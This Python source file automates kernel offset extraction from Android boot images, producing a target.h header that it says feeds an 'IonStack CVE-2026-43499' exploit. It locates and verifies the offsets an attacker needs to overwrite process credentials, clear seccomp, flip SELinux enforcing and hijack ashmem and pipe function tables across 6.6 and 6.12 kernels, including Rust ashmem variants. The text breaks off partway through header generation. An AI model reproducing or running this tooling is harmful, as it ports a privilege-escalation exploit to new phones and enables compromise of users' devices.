#!/usr/bin/env python3
"""
auto_extract_offsets.py - Automated kernel offset extraction from Android boot.img

Extracts kernel symbol offsets and struct field offsets from an Android boot.img,
producing a target.h file compatible with the IonStack CVE-2026-43499 exploit.

Usage:
    python3 auto_extract_offsets.py <boot.img> [options]

Options:
    -o, --output DIR        Output directory (default: ./extracted_target)
    -k, --kallsyms FILE     Pre-recovered kallsyms file (skip kallsyms recovery)
    --keep-intermediate     Keep intermediate files (kernel.Image, kallsyms.txt)
    --target-name NAME      Target directory name (default: auto-detected)
"""

import argparse
import struct
import subprocess
import sys
import os
import re
import gzip

# ============================================================================
# Constants
# ============================================================================

# LZ4 legacy frame magic: 0x02214C18 stored as big-endian in file.
# When read as LE32 (struct.unpack '<I'), the value is 0x184C2102.
LZ4_LEGACY_MAGIC_LE = 0x184C2102
GZIP_MAGIC = b'\x1f\x8b'
ARM64_IMAGE_MAGIC = 0x644d5241  # "ARMd"

# Symbols required for target.h (name → define_prefix)
REQUIRED_SYMBOLS = {
    'ashmem_misc':           'ASHMEM_MISC',
    'ashmem_fops':           'ASHMEM_FOPS',
    'ashmem_ioctl':          'ASHMEM_IOCTL',
    'compat_ashmem_ioctl':   'ASHMEM_COMPAT_IOCTL',
    'ashmem_mmap':           'ASHMEM_MMAP',
    'ashmem_open':           'ASHMEM_OPEN',
    'ashmem_release':        'ASHMEM_RELEASE',
    'ashmem_show_fdinfo':    'ASHMEM_SHOW_FDINFO',
    'configfs_read_iter':    'CONFIGFS_READ_ITER',
    'configfs_bin_write_iter': 'CONFIGFS_BIN_WRITE_ITER',
    'copy_splice_read':      'COPY_SPLICE_READ',
    'noop_llseek':           'NOOP_LLSEEK',
    'init_task':             'INIT_TASK',
    'root_task_group':       'ROOT_TASK_GROUP',
    'selinux_blob_sizes':    'SELINUX_BLOB_SIZES',
    'selinux_state':         'SELINUX_STATE',
    'security_hook_heads':   'SECURITY_HOOK_HEADS',
    'kmalloc_caches':        'KMALLOC_CACHES',
    'anon_pipe_buf_ops':     'ANON_PIPE_BUF_OPS',
    'nfulnl_logger':         'SLIDE_NFULNL_LOGGER',
    'loggers':               'SLIDE_LOGGERS',
    'sysctl_bootid':         'SLIDE_SYSCTL_BOOTID',
    'random_table':          'RANDOM_TABLE',
    '_text':                 '_TEXT',
}

# Symbol name alternatives (try these if primary not found)
SYMBOL_ALIASES = {
    'compat_ashmem_ioctl':   ['compat_ashmem_ioctl', 'ashmem_compat_ioctl'],
    'noop_llseek':           ['noop_llseek', 'no_llseek'],
    'configfs_read_iter':    ['configfs_read_iter'],
    'configfs_bin_write_iter': ['configfs_bin_write_iter'],
    'copy_splice_read':      ['copy_splice_read', 'generic_file_splice_read'],
    'ashmem_show_fdinfo':    ['ashmem_show_fdinfo'],
}

# Rust ashmem MiscDevice vtable method patterns (Qualcomm sm8850 6.12 kernel).
# On this kernel ashmem is implemented in Rust (ashmem_rust module), so the
# traditional C symbols (ashmem_fops, ashmem_misc) do not exist. The MiscDevice
# vtable methods have mangled Rust symbol names like:
#   _RNvMs4_...MiscdeviceVTableNtCs<hash>6AshmemE<len><method>B<build>_
# We match on "6AshmemE<len><method>" to find the main Ashmem type (not
# AshmemToggle variants which use "16AshmemToggleMisc").
RUST_ASHMEM_METHOD_PATTERNS = {
    'open':         '6AshmemE4open',
    'ioctl':        '6AshmemE5ioctl',
    'llseek':       '6AshmemE6llseek',
    'release':      '6AshmemE7release',
    'read_iter':    '6AshmemE9read_iter',
    'mmap':         '6AshmemE4mmap',
    'show_fdinfo':  '6AshmemE11show_fdinfo',
    'compat_ioctl': '6AshmemE12compat_ioctl',
}

# file_operations struct field offsets differ between kernel versions.
# 6.12 removed/shifted fields before open, so open/release/show_fdinfo moved
# down by 8 bytes compared to 6.6 GKI. Only the fields we verify/match are
# listed here.
FOPS_LAYOUTS = {
    '6.6': {
        'owner': 0x00, 'llseek': 0x08, 'read': 0x10, 'write': 0x18,
        'read_iter': 0x20, 'write_iter': 0x28,
        'ioctl': 0x48, 'compat_ioctl': 0x50, 'mmap': 0x58,
        'open': 0x68, 'release': 0x78, 'show_fdinfo': 0xd8,
    },
    '6.12': {
        'owner': 0x00, 'llseek': 0x08, 'read': 0x10, 'write': 0x18,
        'read_iter': 0x20, 'write_iter': 0x28,
        'ioctl': 0x48, 'compat_ioctl': 0x50, 'mmap': 0x58,
        'open': 0x60, 'release': 0x70, 'show_fdinfo': 0xd0,
    },
}

# Canonical fops field offsets for target.h generation, per layout version.
# These are the FOPS_*_OFF defines written at the bottom of target.h.
FOPS_FIELD_DEFINES = {
    '6.6': [
        ("FOPS_OWNER_OFF", "0x00"),
        ("FOPS_LLSEEK_OFF", "0x08"),
        ("FOPS_READ_OFF", "0x10"),
        ("FOPS_WRITE_OFF", "0x18"),
        ("FOPS_READ_ITER_OFF", "0x20"),
        ("FOPS_WRITE_ITER_OFF", "0x28"),
        ("FOPS_IOCTL_OFF", "0x48"),
        ("FOPS_COMPAT_IOCTL_OFF", "0x50"),
        ("FOPS_MMAP_OFF", "0x58"),
        ("FOPS_OPEN_OFF", "0x68"),
        ("FOPS_RELEASE_OFF", "0x78"),
        ("FOPS_SPLICE_READ_OFF", "0xb8"),
        ("FOPS_SHOW_FDINFO_OFF", "0xd8"),
    ],
    '6.12': [
        ("FOPS_OWNER_OFF", "0x00"),
        ("FOPS_LLSEEK_OFF", "0x08"),
        ("FOPS_READ_OFF", "0x10"),
        ("FOPS_WRITE_OFF", "0x18"),
        ("FOPS_READ_ITER_OFF", "0x20"),
        ("FOPS_WRITE_ITER_OFF", "0x28"),
        ("FOPS_IOCTL_OFF", "0x48"),
        ("FOPS_COMPAT_IOCTL_OFF", "0x50"),
        ("FOPS_MMAP_OFF", "0x58"),
        ("FOPS_OPEN_OFF", "0x60"),
        ("FOPS_RELEASE_OFF", "0x70"),
        ("FOPS_SPLICE_READ_OFF", "0xb8"),
        ("FOPS_SHOW_FDINFO_OFF", "0xd0"),
    ],
}

# CTL_TABLE entry size (struct ctl_table on arm64 Linux 6.6)
CTL_TABLE_ENTRY_SIZE = 0x40
CTL_TABLE_DATA_OFF = 0x08  # .data field offset within ctl_table

# ============================================================================
# LZ4 Block Decompression (pure Python, no dependencies)
# ============================================================================

def lz4_decompress_block(src):
    """Decompress a single LZ4 block (no size header)."""
    out = bytearray()
    pos = 0
    n = len(src)
    while pos < n:
        token = src[pos]
        pos += 1
        # Literal length
        lit_len = token >> 4
        if lit_len == 15:
            while pos < n:
                b = src[pos]
                pos += 1
                lit_len += b
                if b != 255:
                    break
        # Copy literals
        avail = min(lit_len, n - pos)
        out.extend(src[pos:pos + avail])
        pos += avail
        if pos >= n or avail < lit_len:
            break
        # Read match offset
        if pos + 2 > n:
            break
        offset = src[pos] | (src[pos + 1] << 8)
        pos += 2
        # Match length
        match_len = (token & 0x0f) + 4
        if (token & 0x0f) == 15:
            while pos < n:
                b = src[pos]
                pos += 1
                match_len += b
                if b != 255:
                    break
        # Copy match
        if offset == 0 or offset > len(out):
            break
        mp = len(out) - offset
        for i in range(match_len):
            out.append(out[mp + i])
    return bytes(out)


def decompress_lz4_legacy(data):
    """Decompress LZ4 legacy frame (magic 0x02214c18)."""
    out = bytearray()
    pos = 4  # skip magic
    while pos + 4 <= len(data):
        bs = struct.unpack_from('<I', data, pos)[0]
        pos += 4
        if bs == 0:  # endmark
            break
        if pos + bs > len(data):
            # Truncated last block
            bs = len(data) - pos
            if bs == 0:
                break
        block = data[pos:pos + bs]
        pos += bs
        out.extend(lz4_decompress_block(block))
    return bytes(out)


# ============================================================================
# Boot Image Parsing
# ============================================================================

def parse_boot_img(data):
    """Parse Android boot image header (v0-v4). Returns dict with kernel info."""
    if data[0:8] != b'ANDROID!':
        raise ValueError(f"Not an Android boot image: {data[0:8]!r}")

    kernel_size = struct.unpack_from('<I', data, 0x08)[0]
    header_size = struct.unpack_from('<I', data, 0x14)[0] if len(data) > 0x18 else 0

    # Detect header version
    # v3/v4: header_version at offset 0x28
    # v0-v2: page_size at 0x24, header_version elsewhere
    hdr_ver = struct.unpack_from('<I', data, 0x28)[0] if len(data) > 0x2c else 0

    if hdr_ver >= 3:
        page_size = 4096
    else:
        # v0/v1/v2: page_size at 0x24
        page_size = struct.unpack_from('<I', data, 0x24)[0] if len(data) > 0x28 else 4096
        if page_size == 0:
            page_size = 4096

    kernel_offset = page_size  # kernel starts right after header page

    info = {
        'kernel_size': kernel_size,
        'kernel_offset': kernel_offset,
        'header_version': hdr_ver,
        'page_size': page_size,
        'header_size': header_size,
        'data': data,
    }
    return info


# ============================================================================
# Kernel Decompression
# ============================================================================

def extract_kernel(boot_info):
    """Extract and decompress kernel Image from boot.img."""
    data = boot_info['data']
    off = boot_info['kernel_offset']
    size = boot_info['kernel_size']
    kernel_raw = data[off:off + size]

    if len(kernel_raw) < 4:
        raise ValueError("Kernel payload too small")

    # Check LZ4 legacy (magic stored big-endian in file, read as LE32)
    magic32 = struct.unpack_from('<I', kernel_raw, 0)[0]
    if magic32 == LZ4_LEGACY_MAGIC_LE:
        print("  Kernel compression: LZ4 legacy frame")
        return decompress_lz4_legacy(kernel_raw)

    # Check gzip
    if kernel_raw[0:2] == GZIP_MAGIC:
        print("  Kernel compression: gzip")
        return gzip.decompress(kernel_raw)

    # Raw Image
    print("  Kernel compression: none (raw Image)")
    return kernel_raw


# ============================================================================
# Kallsyms Recovery
# ============================================================================

def recover_kallsyms(kernel_image_path):
    """Recover kallsyms from kernel Image. Returns dict {name: address}."""
    # Method 1: kallsyms-finder CLI
    try:
        result = subprocess.run(
            ['kallsyms-finder', kernel_image_path],
            capture_output=True, text=True, timeout=300
        )
        if result.returncode == 0 and result.stdout.strip():
            print("  Kallsyms recovered via kallsyms-finder")
            return parse_kallsyms_text(result.stdout)
    except FileNotFoundError:
        pass
    except subprocess.TimeoutExpired:
        print("  kallsyms-finder timed out", file=sys.stderr)

    # Method 2: vmlinux-to-elf + nm
    try:
        elf_path = kernel_image_path + '.elf'
        result = subprocess.run(
            ['vmlinux-to-elf', kernel_image_path, elf_path],
            capture_output=True, text=True, timeout=300
        )
        if result.returncode == 0 and os.path.exists(elf_path):
            result = subprocess.run(
                ['nm', elf_path],
                capture_output=True, text=True, timeout=60
            )
            if result.returncode == 0 and result.stdout.strip():
                print("  Kallsyms recovered via vmlinux-to-elf + nm")
                return parse_kallsyms_text(result.stdout)
    except FileNotFoundError:
        pass
    except subprocess.TimeoutExpired:
        print("  vmlinux-to-elf timed out", file=sys.stderr)

    raise RuntimeError(
        "Kallsyms recovery failed.\n"
        "  Install vmlium-to-elf:  pip install vmlinux-to-elf\n"
        "  Or provide pre-recovered kallsyms:  --kallsyms <file>"
    )


def parse_kallsyms_text(text):
    """Parse kallsyms text output (format: address type name)."""
    syms = {}
    for line in text.splitlines():
        parts = line.split()
        if len(parts) >= 3:
            try:
                addr = int(parts[0], 16)
                name = parts[2]
                # Some nm outputs have extra info after name
                if name not in syms:
                    syms[name] = addr
            except ValueError:
                continue
    return syms


def parse_kallsyms_file(path):
    """Parse kallsyms from file."""
    with open(path) as f:
        return parse_kallsyms_text(f.read())


# ============================================================================
# Binary Analysis
# ============================================================================

class KernelImage:
    """Wrapper for kernel Image binary with symbol lookup."""

    def __init__(self, img_bytes, syms):
        self.img = img_bytes
        self.syms = syms
        self.kimage_base = syms.get('_text', 0xffffffc080000000)
        self.img_size = len(img_bytes)

    def addr_to_off(self, addr):
        """Convert kernel virtual address to file offset."""
        return addr - self.kimage_base

    def sym_addr(self, name):
        """Get symbol address, trying aliases."""
        if name in self.syms:
            return self.syms[name]
        aliases = SYMBOL_ALIASES.get(name, [name])
        for alias in aliases:
            if alias in self.syms:
                return self.syms[alias]
        return None

    def sym_off(self, name):
        """Get symbol offset from KIMAGE_TEXT_BASE."""
        addr = self.sym_addr(name)
        if addr is None:
            return None
        return addr - self.kimage_base

    def u64(self, offset):
        if 0 <= offset and offset + 8 <= self.img_size:
            return struct.unpack_from('<Q', self.img, offset)[0]
        return None

    def u32(self, offset):
        if 0 <= offset and offset + 4 <= self.img_size:
            return struct.unpack_from('<I', self.img, offset)[0]
        return None

    def read_bytes(self, offset, length):
        if 0 <= offset and offset + length <= self.img_size:
            return self.img[offset:offset + length]
        return None

    def read_string(self, offset, max_len=256):
        """Read null-terminated string from image at file offset."""
        if offset < 0 or offset >= self.img_size:
            return None
        end = self.img.find(b'\x00', offset, offset + max_len)
        if end < 0:
            end = offset + max_len
        try:
            return self.img[offset:end].decode('ascii')
        except UnicodeDecodeError:
            return None

    def read_string_at_addr(self, addr):
        """Read null-terminated string at kernel virtual address."""
        off = self.addr_to_off(addr)
        return self.read_string(off)

    # -- Verification methods --

    def verify_fops_layout(self, fops_sym_name='ashmem_fops', methods=None):
        """Verify file_operations struct layout by checking function pointers.

        Tries both 6.6 and 6.12 fops layouts. Returns:
            (layout_name, fops_off, all_ok)
        where layout_name is '6.6', '6.12', or None if no match.

        For C ashmem: pass fops_sym_name to look up the symbol.
        For Rust ashmem: pass methods dict {method_name: address}.
        """
        if methods is not None:
            # Rust ashmem: no fops symbol, we need to locate the table by
            # scanning for the llseek pointer and verifying the layout.
            return self._find_rust_ashmem_fops_table(methods)

        # C ashmem: look up the symbol and verify against both layouts
        fops_addr = self.sym_addr(fops_sym_name)
        if fops_addr is None:
            return None, None, "symbol not found"
        fops_off = self.addr_to_off(fops_addr)

        # Symbol-to-method mapping for C ashmem
        c_ashmem_methods = {
            'llseek':       'ashmem_llseek',
            'read_iter':    'ashmem_read_iter',
            'ioctl':        'ashmem_ioctl',
            'compat_ioctl': 'compat_ashmem_ioctl',
            'mmap':         'ashmem_mmap',
            'open':         'ashmem_open',
            'release':      'ashmem_release',
            'show_fdinfo':  'ashmem_show_fdinfo',
        }

        # Try each layout
        for layout_name, layout in FOPS_LAYOUTS.items():
            all_ok = True
            for method, sym_name in c_ashmem_methods.items():
                expected = self.sym_addr(sym_name)
                actual = self.u64(fops_off + layout[method])
                if expected is not None and actual is not None:
                    if actual != expected:
                        all_ok = False
                        break
            if all_ok:
                return layout_name, fops_off, True

        # No layout fully matched; default to 6.6
        return '6.6', fops_off, False

    def _find_rust_ashmem_fops_table(self, methods):
        """Locate the file_operations table for Rust ashmem by scanning the
        kernel image for a structure containing the ashmem function pointers.

        Tries both 6.6 and 6.12 fops layouts. Returns:
            (layout_name, fops_off, all_ok)
        """
        if not methods or 'llseek' not in methods:
            return None, None, "no llseek method found"

        # Search for the llseek function pointer value in the kernel image
        llseek_packed = struct.pack('<Q', methods['llseek'])
        pos = 0
        while True:
            idx = self.img.find(llseek_packed, pos)
            if idx < 0:
                break
            pos = idx + 8

            # Try each layout: fops_base = llseek_pos - llseek_offset
            for layout_name, layout in FOPS_LAYOUTS.items():
                fops_base = idx - layout['llseek']
                if fops_base < 0 or fops_base + 0xe0 > self.img_size:
                    continue

                # Verify all known method pointers match
                all_match = True
                for method_name, expected_addr in methods.items():
                    if method_name not in layout:
                        continue
                    actual = self.u64(fops_base + layout[method_name])
                    if actual != expected_addr:
                        all_match = False
                        break

                if all_match:
                    return layout_name, fops_base, True

        return None, None, "no fops table match found"

    def find_rust_ashmem_methods(self):
        """Find Rust ashmem MiscDevice vtable method symbols.

        On Qualcomm sm8850 6.12 kernel, ashmem is implemented in Rust
        (ashmem_rust module). The MiscDevice vtable methods have mangled
        Rust symbol names like:
          _RNvMs4_...MiscdeviceVTableNtCs<hash>6AshmemE<len><method>B<build>_

        Returns dict {method_name: address} or empty dict if not found.
        """
        methods = {}
        for sym_name, addr in self.syms.items():
            if 'MiscdeviceVTable' not in sym_name:
                continue
            # Exclude ashmem_toggle variants (different device)
            if 'ashmem_toggle' in sym_name.lower():
                continue
            for method, pattern in RUST_ASHMEM_METHOD_PATTERNS.items():
                if pattern in sym_name and method not in methods:
                    methods[method] = addr
        return methods

    def find_ashmem_fops_ptr(self):
        """Find the ASHMEM_FOPS_PTR BSS variable (Rust ashmem).

        This variable holds the pointer to the file_operations table at
        runtime, filled in by __ashmem_rust_init. It serves as
        ASHMEM_MISC_FOPS_OFF since the miscdevice struct is initialized at
        runtime (BSS) rather than having a static fops pointer.
        """
        for sym_name, addr in self.syms.items():
            if 'ASHMEM_FOPS_PTR' in sym_name:
                return self.addr_to_off(addr), sym_name
        return None, None

    def find_security_hook_heads_off(self):
        """Find SECURITY_HOOK_HEADS offset.

        On kernels <= 6.6, uses the security_hook_heads symbol directly.
        On 6.12+ kernels, security_hook_heads was replaced by static-call
        based security_hook_active_* slots. In that case, compute:
          security_hook_active_capable_0 - 0x40
        so that SECURITY_CAPABLE_HEAD (= SECURITY_HOOK_HEADS + 0x40) lands
        on security_hook_active_capable_0 (the closest equivalent for the
        capable hook).

        Returns (offset, source_description) or (None, None).
        """
        # Try traditional symbol first (6.6 and earlier)
        off = self.sym_off('security_hook_heads')
        if off is not None:
            return off, 'security_hook_heads symbol'

        # Fallback: 6.12 static-call based hooks
        capable_0 = self.sym_addr('security_hook_active_capable_0')
        if capable_0 is not None:
            computed = self.addr_to_off(capable_0) - 0x40
            return computed, 'security_hook_active_capable_0 - 0x40 (6.12 static calls)'

        return None, None

    def verify_task_offsets(self):
        """Verify task_struct field offsets using init_task.

        Supports both GKI 6.6 and 6.12 kernel layouts. Tries known offsets
        for each version, then falls back to a search if needed.
        """
        init_task_addr = self.sym_addr('init_task')
        init_cred_addr = self.sym_addr('init_cred')
        if init_task_addr is None:
            return {}

        task_off = self.addr_to_off(init_task_addr)
        results = {}

        # Known task_struct offsets for different kernel versions.
        # Each field has a list of candidate offsets to try (6.6, then 6.12).
        KNOWN_CANDIDATES = {
            'TASK_TASKS_OFF':       [0x550, 0x590],
            'TASK_COMM_OFF':        [0x830],
            'TASK_REAL_PARENT_OFF': [0x628],
            'TASK_REAL_CRED_OFF':   [0x818],
            'TASK_CRED_OFF':        [0x820],
            'TASK_PID_OFF':         [0x618],
            'TASK_TGID_OFF':        [0x61c],
            'TASK_ATOMIC_FLAGS_OFF':[0x5d8],
            'TASK_SECCOMP_OFF':     [0x8e8],
        }

        # TASK_TASKS_OFF: verify self-referencing list_head at known offset
        found = False
        for off_val in KNOWN_CANDIDATES['TASK_TASKS_OFF']:
            nxt = self.u64(task_off + off_val)
            prv = self.u64(task_off + off_val + 8)
            if nxt is not None and nxt == prv and nxt == init_task_addr + off_val:
                results['TASK_TASKS_OFF'] = off_val
                found = True
                break
        if not found:
            # Fallback: search for self-referencing list_head in 0x500-0x600
            for candidate in range(0x500, 0x600, 8):
                n = self.u64(task_off + candidate)
                p = self.u64(task_off + candidate + 8)
                if n is not None and n == p and n == init_task_addr + candidate:
                    results['TASK_TASKS_OFF'] = candidate
                    break

        # TASK_COMM_OFF: verify "swapper" at known offset
        off_val = KNOWN_CANDIDATES['TASK_COMM_OFF'][0]
        s = self.read_string(task_off + off_val, 16)
        if s == 'swapper':
            results['TASK_COMM_OFF'] = off_val
        else:
            for candidate in range(0x800, 0x900, 0x10):
                s = self.read_string(task_off + candidate, 16)
                if s == 'swapper':
                    results['TASK_COMM_OFF'] = candidate
                    break

        # TASK_REAL_PARENT_OFF: verify points to init_task
        off_val = KNOWN_CANDIDATES['TASK_REAL_PARENT_OFF'][0]
        val = self.u64(task_off + off_val)
        if val == init_task_addr:
            results['TASK_REAL_PARENT_OFF'] = off_val

        # TASK_REAL_CRED_OFF and TASK_CRED_OFF: verify point to init_cred
        for name in ['TASK_REAL_CRED_OFF', 'TASK_CRED_OFF']:
            off_val = KNOWN_CANDIDATES[name][0]
            val = self.u64(task_off + off_val)
            if val == init_cred_addr:
                results[name] = off_val

        # TASK_PID_OFF and TASK_TGID_OFF: verify both are 0
        for name in ['TASK_PID_OFF', 'TASK_TGID_OFF']:
            off_val = KNOWN_CANDIDATES[name][0]
            val = self.u32(task_off + off_val)
            if val == 0:
                results[name] = off_val

        # TASK_ATOMIC_FLAGS_OFF: verify is 0
        off_val = KNOWN_CANDIDATES['TASK_ATOMIC_FLAGS_OFF'][0]
        val = self.u32(task_off + off_val)
        if val is not None and val == 0:
            results['TASK_ATOMIC_FLAGS_OFF'] = off_val

        # TASK_SECCOMP_OFF: verify mode=0, filter_count=0, filter=NULL
        off_val = KNOWN_CANDIDATES['TASK_SECCOMP_OFF'][0]
        mode = self.u32(task_off + off_val)
        fcount = self.u32(task_off + off_val + 4)
        filter_ptr = self.u64(task_off + off_val + 8)
        if mode == 0 and fcount == 0 and filter_ptr is not None and filter_ptr == 0:
            results['TASK_SECCOMP_OFF'] = off_val
        else:
            # Fallback: search for 16-byte zero pattern after comm
            for candidate in range(0x880, 0x920, 8):
                m = self.u32(task_off + candidate)
                fc = self.u32(task_off + candidate + 4)
                fp = self.u64(task_off + candidate + 8)
                if m == 0 and fc == 0 and fp is not None and fp == 0:
                    results['TASK_SECCOMP_OFF'] = candidate
                    break

        return results

    def verify_cred_offsets(self):
        """Verify cred struct field offsets using init_cred.

        Uses known GKI 6.6 offsets as targets and verifies them via binary analysis.
        """
        init_cred_addr = self.sym_addr('init_cred')
        if init_cred_addr is None:
            return {}

        cred_off = self.addr_to_off(init_cred_addr)
        results = {}

        # Known GKI 6.6 cred struct offsets to verify
        KNOWN = {
            'CRED_UID_OFF': 8,
            'CRED_SECUREBITS_OFF': 40,
            'CRED_CAPS_OFF': 48,
            'CRED_SECURITY_OFF': 128,
        }

        # CRED_UID_OFF: uid should be 0
        if self.u32(cred_off + KNOWN['CRED_UID_OFF']) == 0:
            results['CRED_UID_OFF'] = KNOWN['CRED_UID_OFF']

        # CRED_SECUREBITS_OFF: should be 0
        if self.u32(cred_off + KNOWN['CRED_SECUREBITS_OFF']) == 0:
            results['CRED_SECUREBITS_OFF'] = KNOWN['CRED_SECUREBITS_OFF']

        # CRED_CAPS_OFF: verify CAP_FULL pattern appears at caps+8 (cap_permitted)
        # cap_inheritable at offset 48 is 0 for init_cred, cap_permitted at 56 is CAP_FULL
        cap_full = struct.pack('<Q', 0x000001ffffffffff)
        cred_bytes = self.read_bytes(cred_off, 128)
        if cred_bytes:
            # Find first CAP_FULL occurrence
            for i in range(0, 128, 8):
                if cred_bytes[i:i+8] == cap_full:
                    # CRED_CAPS_OFF = first_cap_full - 8 (cap_inheritable)
                    caps_start = i - 8
                    if caps_start >= 32:  # sanity check
                        results['CRED_CAPS_OFF'] = caps_start
                    break

        # CRED_SECURITY_OFF: should be 0 (init_cred.security set at runtime)
        # or a kernel pointer
        val = self.u64(cred_off + KNOWN['CRED_SECURITY_OFF'])
        if val is not None and (val == 0 or (val >> 48) == 0xffff):
            results['CRED_SECURITY_OFF'] = KNOWN['CRED_SECURITY_OFF']

        return results

    def find_ashmem_misc_fops(self):
        """Find ASHMEM_MISC_FOPS offset by reading ashmem_misc.fops pointer."""
        misc_addr = self.sym_addr('ashmem_misc')
        fops_addr = self.sym_addr('ashmem_fops')
        if misc_addr is None or fops_addr is None:
            return None, "ashmem_misc or ashmem_fops not found"

        misc_off = self.addr_to_off(misc_addr)

        # Search for fops pointer in ashmem_misc struct (first 0x48 bytes)
        for i in range(0, 0x48, 8):
            val = self.u64(misc_off + i)
            if val == fops_addr:
                return misc_off + i, f"found at ashmem_misc+{i:#x}"

        return None, "fops pointer not found in ashmem_misc"

    def find_slide_offsets(self):
        """Find SLIDE offsets by parsing random_table for boot_id entry."""
        results = {}

        # SLIDE_NFULNL_LOGGER and SLIDE_LOGGERS
        results['SLIDE_NFULNL_LOGGER_OFF'] = self.sym_off('nfulnl_logger')
        results['SLIDE_LOGGERS_0_1_OFF'] = self.sym_off('loggers')
        results['SLIDE_SYSCTL_BOOTID_OFF'] = self.sym_off('sysctl_bootid')

        # SLIDE_RANDOM_BOOT_ID_DATA: parse random_table to find boot_id entry
        rt_addr = self.sym_addr('random_table')
        if rt_addr is not None:
            rt_off = self.addr_to_off(rt_addr)
            boot_id_data_off = None
            for idx in range(16):  # check first 16 entries
                entry_off = rt_off + idx * CTL_TABLE_ENTRY_SIZE
                procname_ptr = self.u64(entry_off)
                if procname_ptr is None or procname_ptr == 0:
                    break
                name = self.read_string_at_addr(procname_ptr)
                if name == 'boot_id':
                    boot_id_data_off = entry_off + CTL_TABLE_DATA_OFF
                    break

            if boot_id_data_off is not None:
                results['SLIDE_RANDOM_BOOT_ID_DATA_OFF'] = boot_id_data_off
            else:
                # Fallback: assume boot_id at index 4 (standard kernel layout)
                results['SLIDE_RANDOM_BOOT_ID_DATA_OFF'] = (
                    rt_off + 4 * CTL_TABLE_ENTRY_SIZE + CTL_TABLE_DATA_OFF
                )

        return results

    def verify_selinux(self):
        """Verify SELinux offsets."""
        results = {}
        results['SELINUX_BLOB_SIZES_OFF'] = self.sym_off('selinux_blob_sizes')

        # SELINUX_ENFORCING_OFF: selinux_state.enforcing is at +0x00
        state_addr = self.sym_addr('selinux_state')
        if state_addr is not None:
            results['SELINUX_ENFORCING_OFF'] = self.addr_to_off(state_addr)

        return results


# ============================================================================
# Build Info Extraction
# ============================================================================

def extract_build_info(boot_data, kernel_img):
    """Extract build fingerprint and Linux version from boot.img and kernel."""
    info = {}

    # Search kernel Image for Linux version string
    version_pattern = rb'Linux version (\d+\.\d+\.\d+-android\d+-\d+[^\x00\x20]{0,60})'
    m = re.search(version_pattern, kernel_img)
    if m:
        info['linux_version'] = m.group(1).decode('ascii', errors='replace')
        # Extract android version
        avm = re.search(rb'android(\d+)-(\d+)', m.group(1))
        if avm:
            info['android_version'] = int(avm.group(1))
            info['kmi_version'] = int(avm.group(2))
        # Extract kernel build variant (e.g., "abogki" from
        # "6.6.89-android15-8-g7e1f3c083cc6-abogki467167594-4k")
        # Pattern: after git commit "g<hex>-" comes the variant name (letters)
        # followed by digits and optional "-<pagesize>".
        kvm = re.search(r'-g[0-9a-f]+-([a-zA-Z]+)\d+', info['linux_version'])
        if kvm:
            info['kernel_variant'] = kvm.group(1).lower()

    # Search boot.img for build fingerprint
    # Pattern: brand/product/device:version/id/number:type/keys
    fp_pattern = rb'([\w\-]+)/([\w\-]+)/([\w\-]+):(\d+)/([\w.]+)/(\d+):(\w+)/([\w\-]+)'
    for m in re.finditer(fp_pattern, boot_data):
        s = m.group(0)
        # Check it's a real fingerprint (contains "release-keys" or "user")
        if b'release-keys' in s or b'user' in s:
            # Find null terminator
            null_idx = s.find(b'\x00')
            if null_idx > 0:
                s = s[:null_idx]
            info['build_fingerprint'] = s.decode('ascii', errors='replace')
            break

    # Extract build ID from fingerprint
    if 'build_fingerprint' in info:
        fp = info['build_fingerprint']
        parts = fp.split('/')
        if len(parts) >= 5:
            build_id = parts[3]  # e.g., AP3A.240617.008
            info['build_id'] = build_id
            # Device name from fingerprint
            device = parts[2] if len(parts) > 2 else 'unknown'
            info['device'] = device

    return info


def detect_phys_offset(build_info):
    """Detect P0_PHYS_OFFSET based on platform heuristics."""
    fp = build_info.get('build_fingerprint', '').lower()
    device = build_info.get('device', '').lower()

    # MediaTek platforms: physical memory starts at 0x40000000
    if 'alps' in fp or 'mt' in device or 'mgvi' in fp:
        return 0x40000000

    # Qualcomm / Google Pixel platforms: physical memory at 0x80000000
    return 0x80000000


def get_text_offset(kernel_img):
    """Extract text_offset from arm64 Image header."""
    if len(kernel_img) < 0x28:
        return 0
    # arm64 Image header: text_offset at 0x08 (8 bytes LE)
    text_offset = struct.unpack_from('<Q', kernel_img, 0x08)[0]
    # Sanity check
    if text_offset > 0x200000:
        return 0
    return text_offset


# ============================================================================
# Target.h Generation
# ============================================================================

def generate_targeth(target_name, build_info, kimage_base, phys_offset,
                     text_offset, offsets, verified, device_override=None,
                     fops_layout='6.6', ashmem_impl='c'):
    """Generate target.h content string."""

    kernel_phys_load = phys_offset + text_offset

    # Build variant label: "<device>_<buildid>_<kernel_variant>"
    # e.g., "ace5s_ap3a_240617_008_abogki"
    build_id = build_info.get('build_id', 'unknown')
    if device_override:
        device = device_override
    else:
        device = build_info.get('device', 'unknown')
        # Strip ":<androidversion>" suffix from device (e.g.,
        # "mgvi_64_64only_armv82:15" -> "mgvi_64_64only_armv82")
        device = device.split(':')[0]
    bid_norm = build_id.lower().replace('.', '_')
    kernel_variant = build_info.get('kernel_variant', '')
    if kernel_variant:
        variant_label = f"{device}_{bid_norm}_{kernel_variant}"
    else:
        variant_label = f"{device}_{bid_norm}"
    fingerprint = build_info.get('build_fingerprint', 'unknown')

    # Collect all symbol offsets
    def off(name):
        return offsets.get(name)

    lines = []
    lines.append("#ifndef OFFSET_H")
    lines.append("#define OFFSET_H")
    lines.append("")
    lines.append(f'#define BUILD_VARIANT_LABEL "{variant_label}"')
    lines.append("#ifndef BUILD_FINGERPRINT")
    lines.append(f'#define BUILD_FINGERPRINT "{fingerprint}"')
    lines.append("#endif")
    lines.append("")
    lines.append(f"#define KIMAGE_TEXT_BASE {kimage_base:#018x}ULL")
    lines.append("#define P0_PAGE_OFFSET 0xffffff8000000000ULL")
    lines.append(f"#define P0_PHYS_OFFSET {phys_offset:#010x}ULL")
    lines.append(f"#define P0_KERNEL_PHYS_LOAD {kernel_phys_load:#010x}ULL")
    lines.append("#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL")
    lines.append("#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL")
    lines.append("#define DIRECT_MAP_BASE 0xffffff8000000000ULL")
    lines.append("#define DIRECT_MAP_END 0xffffff9000000000ULL")
    lines.append("#define VMEMMAP_START 0xfffffffe00000000ULL")
    lines.append("")

    # Symbol offsets
    # Add comment for Rust ashmem / static-call security hooks
    if ashmem_impl == 'rust':
        lines.append("/* ashmem is implemented in Rust (ashmem_rust module) on this")
        lines.append(" * kernel, so the traditional C symbols (ashmem_fops, ashmem_misc)")
